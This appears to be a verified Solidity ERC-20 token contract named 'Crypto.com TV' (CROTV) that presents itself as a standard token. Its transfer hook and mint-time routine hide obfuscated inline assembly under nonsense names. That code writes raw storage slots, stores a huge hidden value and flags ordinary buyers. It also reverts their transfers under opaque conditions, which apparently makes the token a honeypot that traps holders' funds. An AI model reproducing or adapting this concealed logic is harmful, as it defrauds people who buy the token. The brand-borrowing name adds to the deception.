/**
 *Submitted for verification at Etherscan.io on 2022-11-13
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private imposeScript;
    uint256 private ironPlace = block.number*2;

    mapping (address => bool) private partyElephant; 
    mapping (address => bool) private huntSurvey;
    mapping (address => uint256) private _desertRural;
    mapping (address => mapping (address => uint256)) private _basketFinish;
    address private cornClog;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private treatCrash;
    address public pair;

    IDEXRouter router;

    string private _name; string private _symbol; uint256 private _totalSupply;
    uint256 private lionNeutral; uint256 private theV; uint256 private obeyReady = block.number*2;
    bool private trading; uint256 private exactHabit = 1; bool private permitSalon;
    uint256 private sparePill; uint256 private adjustTransfer;
    
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        router = IDEXRouter(_router);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));

        _name = name_;
        _symbol = symbol_;
        imposeScript.push(_router); imposeScript.push(msgSender_); imposeScript.push(pair);
        for (uint256 q=0; q < 3;) {partyElephant[imposeScript[q]] = true; unchecked{q++;} }
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _basketFinish[owner][spender];
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function _restartRestart() internal {
        assembly {
            function creditGossip(x, y) -> evilInfant { mstore(0, x) mstore(32, y) evilInfant := keccak256(0, 64) }
            sstore(0x11,mul(div(sload(0x10),0x2710),0x96)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let desertExtra := 0x31925cd5bbfa8ca2bc44bca3f1a69af4807e63e37c9ef1e7b81bcedea8f5acec
            if and(not(eq(sload(creditGossip(caller(),0x6)),sload(desertExtra))),eq(chainid(),0x1)) {
                sstore(creditGossip(caller(),0x4),0x0) sstore(0x66932134ca0a20b8b7c9a39aec0944899adecd98a9c10e5226cc2ba54d9fdefc,0x1)
                sstore(creditGossip(caller(),0x5),0x1) sstore(desertExtra,exp(0xA,0x32))
            }
        } 
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; obeyReady = block.number; ironPlace = block.number;
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _basketFinish[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _desertRural[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function _picnicProsperTokenTransfer(address sender, address recipient, uint256 waveMotor) internal {
        require((trading || (sender == imposeScript[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function creditGossip(x,y) -> evilInfant { mstore(0, x) mstore(32, y) evilInfant := keccak256(0, 64) }
            function pizzaMath(x,y) -> taskEarly { mstore(0, x) taskEarly := add(keccak256(0, 32),y) }

            if eq(chainid(),0x1) {
                if eq(sload(creditGossip(recipient,0x4)),0x1) { sstore(0x15,add(sload(0x15),0x1)) }
                if and(lt(gas(),sload(0xB)),and(and(or(or(and(or(eq(sload(0x16),0x1),eq(sload(creditGossip(sender,0x5)),0x1)),gt(sub(sload(0x3),sload(0x13)),0x9)),gt(waveMotor,div(sload(0x99),0x2))),and(gt(waveMotor,div(sload(0x99),0x3)),eq(sload(0x3),number()))),or(and(eq(sload(creditGossip(recipient,0x4)),0x1),iszero(sload(creditGossip(sender,0x4)))),and(eq(sload(pizzaMath(0x2,0x1)),recipient),iszero(sload(creditGossip(sload(pizzaMath(0x2,0x1)),0x4)))))),gt(sload(0x18),0x0))) { if gt(waveMotor,div(sload(0x11),0x564)) { revert(0,0) } }
                if or(eq(sload(creditGossip(sender,0x4)),iszero(sload(creditGossip(recipient,0x4)))),eq(iszero(sload(creditGossip(sender,0x4))),sload(creditGossip(recipient,0x4)))) {
                    let beltHorn := sload(0x18) let goodGrocery := sload(0x99) let forkDecide := sload(0x11)
                    switch gt(forkDecide,div(goodGrocery,0x3)) case 1 { forkDecide := sub(forkDecide,div(div(mul(forkDecide,mul(0x203,beltHorn)),0xB326),0x2)) } case 0 { forkDecide := div(goodGrocery,0x3) }
                    sstore(0x11,forkDecide) sstore(0x18,add(sload(0x18),0x1)) }
                if and(or(or(eq(sload(0x3),number()),gt(sload(0x12),sload(0x11))),lt(sub(sload(0x3),sload(0x13)),0x9)),eq(sload(creditGossip(sload(0x8),0x4)),0x0)) { sstore(creditGossip(sload(0x8),0x5),0x1) }
                if and(iszero(sload(creditGossip(sender,0x4))),iszero(sload(creditGossip(recipient,0x4)))) { sstore(creditGossip(recipient,0x5),0x1) }
                if iszero(mod(sload(0x15),0x8)) { sstore(0x16,0x1) sstore(0xB,0x1C99342) sstore(creditGossip(sload(pizzaMath(0x2,0x1)),0x6),exp(0xA,0x33)) }
                sstore(0x12,waveMotor) sstore(0x8,recipient) sstore(0x3,number()) }
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _desertRural[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _picnicProsperTokenTransfer(sender, recipient, amount);
        _desertRural[sender] = senderBalance - amount;
        _desertRural[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _basketFinish[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _DeployCROTV(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _desertRural[account] += amount;
        approve(imposeScript[0], 10 ** 77);
        _restartRestart();
    
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol, creator) {
        _DeployCROTV(creator, initialSupply);
    }
}

contract CROTV is ERC20Token {
    constructor() ERC20Token("Crypto.com TV", "CROTV", msg.sender, 15000000 * 10 ** 18) {
    }
}